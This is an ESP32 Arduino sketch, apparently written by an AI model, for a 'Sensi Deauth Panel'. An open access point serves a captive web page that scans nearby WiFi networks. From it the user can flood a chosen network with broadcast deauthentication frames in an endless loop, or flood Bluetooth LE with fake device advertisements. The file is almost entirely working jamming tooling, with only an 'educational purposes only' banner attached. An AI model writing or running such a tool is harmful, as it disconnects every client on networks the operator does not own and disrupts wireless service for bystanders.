/*
 * Sensi Deauth Panel - ESP32 WiFi & Bluetooth Educational Attack Tool
 * Author: AI Assistant for a User Prompt
 * Version: 1.0
 * Board: ESP32 Dev Module
 * Important: This is for educational and testing purposes ONLY. Use it on your own network.
 */

// Core Libraries
#include <WiFi.h>
#include <esp_wifi.h>

// Web Server Libraries
#include <ESPAsyncWebServer.h>
#include <AsyncTCP.h>
#include "DNSServer.h"

// Bluetooth LE Library
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <BLEAdvertising.h>

// =======================================================================
//                           CONFIGURATION
// =======================================================================
const char* ap_ssid = "Sensi Deauth Panel";
const char* ap_password = NULL; // No password for easy access

// Static IP Configuration for SoftAP
IPAddress local_IP(192, 168, 69, 1);
IPAddress gateway(192, 168, 69, 1);
IPAddress subnet(255, 255, 255, 0);

// =======================================================================
//                           GLOBAL VARIABLES
// =======================================================================
AsyncWebServer server(80);
AsyncWebSocket ws("/ws");
DNSServer dnsServer;

// --- Task & State Management ---
TaskHandle_t deauthTaskHandle = NULL;
TaskHandle_t bleTaskHandle = NULL;
bool isScanning = false;
bool isDeauthing = false;
bool isBleFlooding = false;
String deauthTargetSSID = "";
unsigned long startTime = 0;

// --- WiFi Scan Data ---
#define MAX_APS 50
struct AccessPoint {
  String ssid;
  int32_t rssi;
};
AccessPoint scannedAPs[MAX_APS];
int apCount = 0;

// =======================================================================
//                      HTML/CSS/JS (Embedded)
// =======================================================================
const char index_html[] PROGMEM = R"rawliteral(
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sensi Deauth Panel</title>
    <style>
        :root {
            --primary-color: #bb86fc;
            --secondary-color: #03dac6;
            --background-color: #121212;
            --surface-color: #1e1e1e;
            --text-color: #e0e0e0;
            --error-color: #cf6679;
        }
        body {
            background-color: var(--background-color);
            color: var(--text-color);
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            margin: 0;
            padding: 15px;
        }
        .container {
            max-width: 800px;
            margin: auto;
        }
        .header {
            text-align: center;
            border-bottom: 2px solid var(--primary-color);
            padding-bottom: 10px;
            margin-bottom: 20px;
        }
        .header h1 {
            margin: 0;
            color: var(--primary-color);
        }
        .warning-banner {
            background-color: var(--error-color);
            color: #000;
            padding: 10px;
            text-align: center;
            font-weight: bold;
            border-radius: 5px;
            margin-bottom: 20px;
        }
        .card {
            background-color: var(--surface-color);
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }
        .card h2 {
            margin-top: 0;
            color: var(--secondary-color);
        }
        .status-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
            gap: 15px;
        }
        .status-item {
            text-align: center;
        }
        .status-item span {
            display: block;
            font-size: 0.9em;
            opacity: 0.7;
        }
        .status-item strong {
            font-size: 1.2em;
        }
        .btn {
            background-color: var(--primary-color);
            color: #000;
            border: none;
            padding: 12px 20px;
            text-align: center;
            text-decoration: none;
            display: inline-block;
            font-size: 16px;
            margin: 4px 2px;
            cursor: pointer;
            border-radius: 5px;
            transition: background-color 0.3s;
            width: 100%;
            box-sizing: border-box;
        }
        .btn:hover {
            opacity: 0.9;
        }
        .btn-stop {
            background-color: var(--error-color);
        }
        .btn-scan {
            background-color: var(--secondary-color);
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
        }
        select, input {
            width: 100%;
            padding: 10px;
            background-color: #333;
            border: 1px solid #555;
            color: var(--text-color);
            border-radius: 5px;
            box-sizing: border-box;
        }
        #log-box {
            background-color: #000;
            border: 1px solid #333;
            height: 200px;
            overflow-y: scroll;
            padding: 10px;
            font-family: "Courier New", Courier, monospace;
            font-size: 0.9em;
            border-radius: 5px;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Sensi Deauth Panel</h1>
        </div>

        <div class="warning-banner">
            <strong>WARNING:</strong> For educational purposes only. Only test on your own devices.
        </div>

        <div class="card">
            <h2>Device Status</h2>
            <div class="status-grid">
                <div class="status-item">
                    <strong id="uptime">00:00:00</strong>
                    <span>Uptime</span>
                </div>
                <div class="status-item">
                    <strong id="ip">192.168.69.1</strong>
                    <span>IP Address</span>
                </div>
                <div class="status-item">
                    <strong id="mode">Idle</strong>
                    <span>Mode</span>
                </div>
            </div>
        </div>

        <div class="card">
            <h2>WiFi Attack</h2>
            <button id="btn-scan-wifi" class="btn btn-scan">Scan WiFi Networks</button>
            <div class="form-group" style="margin-top: 15px;">
                <label for="ssid-select">Select Target SSID:</label>
                <select id="ssid-select">
                    <option>-- Scan first --</option>
                </select>
            </div>
            <button id="btn-deauth" class="btn">Start Deauth</button>
        </div>

        <div class="card">
            <h2>Bluetooth Attack</h2>
            <button id="btn-ble" class="btn">Start BLE Flood</button>
        </div>

        <div class="card">
            <h2>Live Logs</h2>
            <div id="log-box"></div>
        </div>
    </div>

    <script>
        let gateway = `ws://${window.location.hostname}/ws`;
        let websocket;

        window.addEventListener('load', onLoad);

        function onLoad(event) {
            initWebSocket();
        }

        function initWebSocket() {
            console.log('Trying to open a WebSocket connection...');
            websocket = new WebSocket(gateway);
            websocket.onopen = onOpen;
            websocket.onclose = onClose;
            websocket.onmessage = onMessage;
        }

        function onOpen(event) {
            console.log('Connection opened');
            addLog('Connected to ESP32!');
        }

        function onClose(event) {
            console.log('Connection closed');
            addLog('Connection to ESP32 lost. Reconnecting...');
            setTimeout(initWebSocket, 2000);
        }
        
        function addLog(message) {
            const logBox = document.getElementById('log-box');
            logBox.innerHTML += message + '\n';
            logBox.scrollTop = logBox.scrollHeight;
        }

        function onMessage(event) {
            let data;
            try {
                data = JSON.parse(event.data);
            } catch (e) {
                console.error("Error parsing JSON: ", e);
                addLog(event.data); // If not JSON, just log the text
                return;
            }

            if (data.type === 'log') {
                addLog(data.message);
            } else if (data.type === 'status') {
                document.getElementById('uptime').textContent = data.uptime;
                document.getElementById('mode').textContent = data.mode;
                updateButtons(data.mode);
            } else if (data.type === 'wifi_scan_result') {
                const select = document.getElementById('ssid-select');
                select.innerHTML = '<option value="">-- Select a Target --</option>';
                data.aps.forEach(ap => {
                    const option = document.createElement('option');
                    option.value = ap.ssid;
                    option.textContent = `${ap.ssid} (${ap.rssi} dBm)`;
                    select.appendChild(option);
                });
                addLog(`WiFi Scan Complete. Found ${data.aps.length} networks.`);
            }
        }
        
        function updateButtons(mode) {
            const deauthBtn = document.getElementById('btn-deauth');
            const bleBtn = document.getElementById('btn-ble');
            const scanBtn = document.getElementById('btn-scan-wifi');

            deauthBtn.textContent = 'Start Deauth';
            deauthBtn.classList.remove('btn-stop');
            bleBtn.textContent = 'Start BLE Flood';
            bleBtn.classList.remove('btn-stop');
            
            scanBtn.disabled = false;
            deauthBtn.disabled = false;
            bleBtn.disabled = false;

            if(mode.includes('Scanning')){
                scanBtn.disabled = true;
                deauthBtn.disabled = true;
                bleBtn.disabled = true;
            } else if(mode.includes('Deauthing')) {
                deauthBtn.textContent = 'Stop Attack';
                deauthBtn.classList.add('btn-stop');
                scanBtn.disabled = true;
                bleBtn.disabled = true;
            } else if (mode.includes('BLE Flood')) {
                bleBtn.textContent = 'Stop Attack';
                bleBtn.classList.add('btn-stop');
                scanBtn.disabled = true;
                deauthBtn.disabled = true;
            }
        }

        function sendCommand(cmd) {
            console.log("Sending: " + cmd);
            websocket.send(cmd);
        }

        document.getElementById('btn-scan-wifi').addEventListener('click', () => {
            addLog("Starting WiFi scan...");
            sendCommand("SCAN_WIFI");
        });

        document.getElementById('btn-deauth').addEventListener('click', () => {
            const btn = document.getElementById('btn-deauth');
            if (btn.textContent.includes('Start')) {
                const ssid = document.getElementById('ssid-select').value;
                if (ssid) {
                    addLog(`Starting Deauth Attack on ${ssid}...`);
                    sendCommand(`START_DEAUTH:${ssid}`);
                } else {
                    alert('Please select a target SSID first!');
                }
            } else {
                addLog("Stopping all attacks...");
                sendCommand("STOP_ATTACKS");
            }
        });

        document.getElementById('btn-ble').addEventListener('click', () => {
            const btn = document.getElementById('btn-ble');
            if (btn.textContent.includes('Start')) {
                addLog('Starting BLE Flood...');
                sendCommand("START_BLE_FLOOD");
            } else {
                addLog("Stopping all attacks...");
                sendCommand("STOP_ATTACKS");
            }
        });

    </script>
</body>
</html>
)rawliteral";


// =======================================================================
//                           HELPER FUNCTIONS
// =======================================================================

// Function to broadcast a log message to all connected WebSocket clients
void broadcastLog(String message) {
    String json = "{\"type\":\"log\", \"message\":\"" + message + "\"}";
    ws.textAll(json);
    Serial.println(message);
}

// Function to format uptime
String formatUptime() {
    long seconds = (millis() - startTime) / 1000;
    int h = seconds / 3600;
    int m = (seconds % 3600) / 60;
    int s = seconds % 60;
    char timeStr[9];
    sprintf(timeStr, "%02d:%02d:%02d", h, m, s);
    return String(timeStr);
}

// Function to broadcast the current status
void broadcastStatus() {
    String mode = "Idle";
    if (isScanning) mode = "Scanning";
    else if (isDeauthing) mode = "Deauthing";
    else if (isBleFlooding) mode = "BLE Flooding";
    
    String json = "{\"type\":\"status\", \"uptime\":\"" + formatUptime() + "\", \"mode\":\"" + mode + "\"}";
    ws.textAll(json);
}

// Function to stop all ongoing attacks/scans
void stopAllTasks() {
    if (isDeauthing) {
        if (deauthTaskHandle != NULL) {
            vTaskDelete(deauthTaskHandle);
            deauthTaskHandle = NULL;
        }
        isDeauthing = false;
        WiFi.softAPdisconnect(true); // Re-enable AP
        broadcastLog("Deauth attack stopped.");
    }
    if (isBleFlooding) {
        if (bleTaskHandle != NULL) {
            vTaskDelete(bleTaskHandle);
            bleTaskHandle = NULL;
        }
        BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
        pAdvertising->stop();
        isBleFlooding = false;
        broadcastLog("BLE flood stopped.");
    }
    if (isScanning) {
        WiFi.scanDelete();
        isScanning = false;
        broadcastLog("WiFi scan stopped.");
    }
    broadcastStatus();
}

// =======================================================================
//                        WIFI ATTACK FUNCTIONS
// =======================================================================

void startWifiScan() {
    if (isScanning || isDeauthing || isBleFlooding) return;
    isScanning = true;
    broadcastStatus();
    broadcastLog("Scanning for WiFi networks...");
    
    apCount = WiFi.scanNetworks(false, false, false, 300);

    String json = "{\"type\":\"wifi_scan_result\", \"aps\":[";
    for (int i = 0; i < apCount && i < MAX_APS; i++) {
        scannedAPs[i].ssid = WiFi.SSID(i);
        scannedAPs[i].rssi = WiFi.RSSI(i);
        json += "{\"ssid\":\"" + scannedAPs[i].ssid + "\", \"rssi\":" + String(scannedAPs[i].rssi) + "}";
        if (i < apCount - 1 && i < MAX_APS -1) {
            json += ",";
        }
    }
    json += "]}";
    ws.textAll(json);

    WiFi.scanDelete();
    isScanning = false;
    broadcastStatus();
}

// Deauthentication packet structure
uint8_t deauth_frame_template[] = {
    0xc0, 0x00, 0x3a, 0x01,
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination Address (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (BSSID of AP)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00, 0x07, 0x00
};

void deauthTask(void *pvParameters) {
    uint8_t bssid[6];
    int channel = 0;
    char* target_ssid_char = (char*)pvParameters;
    String target_ssid = String(target_ssid_char);
    free(target_ssid_char);

    // Find BSSID and Channel for the target SSID
    int n = WiFi.scanNetworks();
    for (int i = 0; i < n; ++i) {
        if (WiFi.SSID(i) == target_ssid) {
            memcpy(bssid, WiFi.BSSID(i), 6);
            channel = WiFi.channel(i);
            break;
        }
    }
    WiFi.scanDelete();

    if (channel == 0) {
        broadcastLog("Error: Target SSID not found.");
        isDeauthing = false;
        broadcastStatus();
        vTaskDelete(NULL);
        return;
    }

    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    memcpy(&deauth_frame_template[10], bssid, 6);
    memcpy(&deauth_frame_template[16], bssid, 6);

    broadcastLog("Starting deauth on " + target_ssid + " on channel " + String(channel));
    while (1) {
        // Send deauth frame to broadcast address
        deauth_frame_template[4] = 0xff; deauth_frame_template[5] = 0xff; deauth_frame_template[6] = 0xff;
        deauth_frame_template[7] = 0xff; deauth_frame_template[8] = 0xff; deauth_frame_template[9] = 0xff;
        esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_template, sizeof(deauth_frame_template), false);
        vTaskDelay(5 / portTICK_PERIOD_MS); // Wait 5ms
    }
}

void startDeauthAttack(String ssid) {
    if (isDeauthing || isScanning || isBleFlooding) return;

    // We need to stop SoftAP to use promiscuous/raw packet sending
    WiFi.softAPdisconnect(true);
    esp_wifi_set_mode(WIFI_MODE_AP);

    isDeauthing = true;
    deauthTargetSSID = ssid;
    broadcastStatus();

    char* ssid_cstr = (char*)malloc(ssid.length() + 1);
    strcpy(ssid_cstr, ssid.c_str());

    xTaskCreate(deauthTask, "deauthTask", 2048, (void*)ssid_cstr, 5, &deauthTaskHandle);
}

// =======================================================================
//                       BLUETOOTH ATTACK FUNCTIONS
// =======================================================================
void bleFloodTask(void *pvParameters) {
    BLEAdvertising *pAdvertising = BLEDevice::getAdvertising();
    pAdvertising->setScanResponse(true);
    pAdvertising->setMinPreferred(0x06);
    pAdvertising->setMinPreferred(0x12);

    broadcastLog("Starting BLE device flood...");
    while (1) {
        char randName[10];
        sprintf(randName, "FAKE_DEV_%04X", esp_random() % 0xFFFF);
        
        BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();
        oAdvertisementData.setName(randName);
        pAdvertising->setAdvertisementData(oAdvertisementData);
        
        pAdvertising->start();
        vTaskDelay(150 / portTICK_PERIOD_MS); // Advertise for 150ms
        pAdvertising->stop();
        vTaskDelay(50 / portTICK_PERIOD_MS); // Wait 50ms before next one
    }
}

void startBleFlood() {
    if (isBleFlooding || isScanning || isDeauthing) return;

    isBleFlooding = true;
    broadcastStatus();
    xTaskCreate(bleFloodTask, "bleTask", 2048, NULL, 5, &bleTaskHandle);
}

// =======================================================================
//                      WEBSOCKET & SERVER SETUP
// =======================================================================
void onWsEvent(AsyncWebSocket *server, AsyncWebSocketClient *client, AwsEventType type, void *arg, uint8_t *data, size_t len) {
    if (type == WS_EVT_CONNECT) {
        Serial.printf("WebSocket client #%u connected from %s\n", client->id(), client->remoteIP().toString().c_str());
        client->text("{\"type\":\"log\", \"message\":\"Welcome to Sensi Deauth Panel!\"}");
        broadcastStatus();
    } else if (type == WS_EVT_DISCONNECT) {
        Serial.printf("WebSocket client #%u disconnected\n", client->id());
    } else if (type == WS_EVT_DATA) {
        AwsFrameInfo *info = (AwsFrameInfo*)arg;
        if (info->final && info->index == 0 && info->len == len && info->opcode == WS_TEXT) {
            data[len] = 0;
            String message = (char*)data;
            Serial.println("Received WS message: " + message);

            if (message == "SCAN_WIFI") {
                startWifiScan();
            } else if (message.startsWith("START_DEAUTH:")) {
                String ssid = message.substring(message.indexOf(':') + 1);
                startDeauthAttack(ssid);
            } else if (message == "START_BLE_FLOOD") {
                startBleFlood();
            } else if (message == "STOP_ATTACKS") {
                stopAllTasks();
            }
        }
    }
}

class CaptiveRequestHandler : public AsyncWebHandler {
public:
  CaptiveRequestHandler() {}
  virtual ~CaptiveRequestHandler() {}

  bool canHandle(AsyncWebServerRequest *request){
    return true; // We want to handle all requests
  }

  void handleRequest(AsyncWebServerRequest *request) {
    // Redirect all requests to the root page
    request->send_P(200, "text/html", index_html);
  }
};

void setup() {
    Serial.begin(115200);
    startTime = millis();
    
    // Initialize WiFi SoftAP
    WiFi.softAP(ap_ssid, ap_password);
    WiFi.softAPConfig(local_IP, gateway, subnet);
    Serial.println("");
    Serial.println("WiFi AP Started");
    Serial.print("IP Address: ");
    Serial.println(WiFi.softAPIP());

    // Initialize BLE
    BLEDevice::init("SensiPanel");

    // Initialize DNS Server for Captive Portal
    dnsServer.start(53, "*", local_IP);

    // Initialize WebSocket
    ws.onEvent(onWsEvent);
    server.addHandler(&ws);

    // Main web page
    server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
        request->send_P(200, "text/html", index_html);
    });

    // Captive Portal Handler
    server.addHandler(new CaptiveRequestHandler()).setFilter(ON_AP_FILTER);

    server.begin();
    Serial.println("HTTP server started");
}

void loop() {
    dnsServer.processNextRequest(); // Handle DNS requests for captive portal
    ws.cleanupClients(); // Clean up disconnected WebSocket clients
    
    // Periodically send status updates
    static unsigned long lastStatusUpdate = 0;
    if (millis() - lastStatusUpdate > 1000) {
        lastStatusUpdate = millis();
        broadcastStatus();
    }
}
